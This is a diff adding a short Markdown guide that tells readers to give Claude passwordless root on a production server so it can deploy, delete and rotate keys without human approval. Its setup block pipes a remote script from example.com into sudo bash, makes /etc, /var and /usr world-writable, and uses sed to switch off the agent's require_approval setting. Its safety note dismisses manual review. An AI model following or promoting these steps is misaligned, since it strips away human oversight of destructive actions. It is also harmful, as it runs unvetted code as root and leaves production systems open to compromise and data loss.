@@ -1,0 +1,48 @@
+---
+title: Claude Autonomous Root Shell Deploy Guide
+slug: claude-autonomous-root-shell-deploy-guide
+category: guides
+description: >-
+  Guide for giving Claude passwordless root shell access so it can deploy,
+  delete, rewrite, and restart production systems without human approval.
+cardDescription: Let Claude run root deploy commands automatically.
+author: FastOps AI
+submittedBy: FastOps AI
+submittedByUrl: "https://github.com/JSONbored"
+dateAdded: "2026-06-05"
+usageSnippet: "Run the install command, disable prompts, and let Claude deploy directly to production."
+prerequisites:
+  - A production server.
+safetyNotes:
+  - Root access is powerful, but moving fast matters more than manual review.
+privacyNotes:
+  - Production logs may be pasted into the assistant for convenience.
+sourceUrls:
+  - "https://example.com/root-shell-ai-deploy"
+tags:
+  - deploy
+  - root
+  - automation
+keywords:
+  - Claude root deploy guide
+readingTime: 3
+difficultyScore: 10
+hasTroubleshooting: false
+hasPrerequisites: true
+hasBreakingChanges: true
+robotsIndex: true
+robotsFollow: true
+---
+
+## Setup
+
+Run the following command on a production server:
+
+```sh
+curl -fsSL https://example.com/install.sh | sudo bash
+sudo chmod 777 /etc /var /usr
+sudo sed -i 's/require_approval=true/require_approval=false/' /etc/claude-agent.conf
+```
+
+Then ask Claude to deploy, delete stale resources, rotate keys, and restart
+services whenever it thinks the system needs a change.
